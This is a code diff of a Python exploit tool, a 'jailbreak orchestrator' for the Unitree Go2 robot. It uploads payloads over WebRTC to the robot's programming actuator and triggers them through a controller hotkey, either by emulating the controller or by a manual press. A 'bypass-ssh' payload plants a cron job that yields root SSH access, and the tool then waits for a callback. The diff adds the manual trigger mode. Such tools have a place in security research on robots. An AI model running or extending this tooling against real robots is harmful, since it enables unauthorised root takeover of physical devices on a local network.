@@ -2,9 +2,9 @@
 WebRTC jailbreak orchestrator for Unitree Go2.
 
 Uploads Python payloads via the WebRTC data channel to programming_actuator,
-bound to a controller hotkey. The hotkey is triggered automatically via the
-WebRTC bridge (which forwards controller messages to the internal DDS bus
-from inside the DDS security perimeter). No physical controller needed.
+bound to a controller hotkey. Supports two trigger modes:
+  - auto:   sends a fake controller press via the WebRTC bridge (experimental)
+  - manual: user presses the hotkey on a physical controller after upload
 Requires LAN adjacency only.
 """
 
@@ -45,10 +45,16 @@ class WebRTCJailbreakOrchestrator:
         self.signaling_port = signaling_port
         self.aes_128_key = aes_128_key
 
-    async def execute(self, wait_for_callback=True, callback_timeout=120.0):
+    async def execute(self, wait_for_callback=True, callback_timeout=120.0,
+                      auto_trigger=True):
         """Four-phase jailbreak: upload -> verify -> trigger -> confirm."""
         p = self.payload
         hotkey = p.bind_hotkey
+
+        if auto_trigger:
+            trigger_label = "auto — bridge emulates controller (experimental)"
+        else:
+            trigger_label = f"manual — press {hotkey} on controller after upload"
 
         print()
         print(f"  {C}{'=' * 62}{RESET}")
@@ -56,7 +62,7 @@ class WebRTCJailbreakOrchestrator:
         print(f"  {C}  Target:  {self.robot_ip}:{self.signaling_port}{RESET}")
         print(f"  {C}  Mode:    {p.name} — {p.description}{RESET}")
         print(f"  {C}  Hotkey:  {hotkey}{RESET}")
-        print(f"  {C}  Trigger: bridge (no physical controller needed){RESET}")
+        print(f"  {C}  Trigger: {trigger_label}{RESET}")
         print(f"  {C}{'=' * 62}{RESET}")
 
         ok, kw = validate_bypass_payload(p.python_code)
@@ -118,9 +124,19 @@ class WebRTCJailbreakOrchestrator:
                     server.close()
                 return False
 
-            print(f"  {G}[4/5]{RESET} Triggering {hotkey} via bridge...")
-            await dc.trigger_hotkey(hotkey)
-            print(f"         {DIM}Trigger sent (no controller needed){RESET}")
+            if auto_trigger:
+                print(f"  {G}[4/5]{RESET} Triggering {hotkey} via bridge "
+                      f"(experimental)...")
+                try:
+                    await dc.trigger_hotkey(hotkey)
+                    print(f"         {DIM}Trigger sent — if execution doesn't "
+                          f"happen, try --trigger manual{RESET}")
+                except Exception as te:
+                    print(f"  {Y}       Bridge trigger failed ({te}){RESET}")
+                    print(f"  {Y}       Press {hotkey} on your controller "
+                          f"to execute{RESET}")
+            else:
+                print(f"  {G}[4/5]{RESET} Payload staged on {hotkey}")
 
         except Exception as e:
             print(f"  {R}  Error during upload/trigger:{RESET} {e}")
@@ -131,19 +147,30 @@ class WebRTCJailbreakOrchestrator:
 
         await dc.close()
 
-        print()
-        print(f"  {G}╔{'═' * 60}╗{RESET}")
-        print(f"  {G}║{RESET}  {BOLD}PAYLOAD DELIVERED + TRIGGERED{RESET}"
-              f"                              {G}║{RESET}")
-        print(f"  {G}╚{'═' * 60}╝{RESET}")
+        if auto_trigger:
+            print()
+            print(f"  {G}╔{'═' * 60}╗{RESET}")
+            print(f"  {G}║{RESET}  {BOLD}PAYLOAD DELIVERED + TRIGGERED{RESET}"
+                  f"                              {G}║{RESET}")
+            print(f"  {G}╚{'═' * 60}╝{RESET}")
+        else:
+            print()
+            print(f"  {Y}╔{'═' * 60}╗{RESET}")
+            print(f"  {Y}║{RESET}  {BOLD}PAYLOAD UPLOADED — PRESS {hotkey} "
+                  f"ON CONTROLLER{RESET}"
+                  f"          {Y}║{RESET}")
+            print(f"  {Y}╚{'═' * 60}╝{RESET}")
+
         print()
         print(f"  {DIM}Script: /unitree/etc/programming/"
               f"{p.program_uuid}.py{RESET}")
 
         if p.name == "bypass-ssh":
             print()
-            print(f"  {C}  Cron job written. Wait up to 60s for crond "
-                  f"to execute.{RESET}")
+            if not auto_trigger:
+                print(f"  {C}  Press {hotkey} on the controller to write "
+                      f"the cron job.{RESET}")
+            print(f"  {C}  Wait up to 60s for crond to execute.{RESET}")
             print(f"  {C}  Then: ssh root@{self.robot_ip}{RESET}")
 
         # Phase 4: Wait for callback
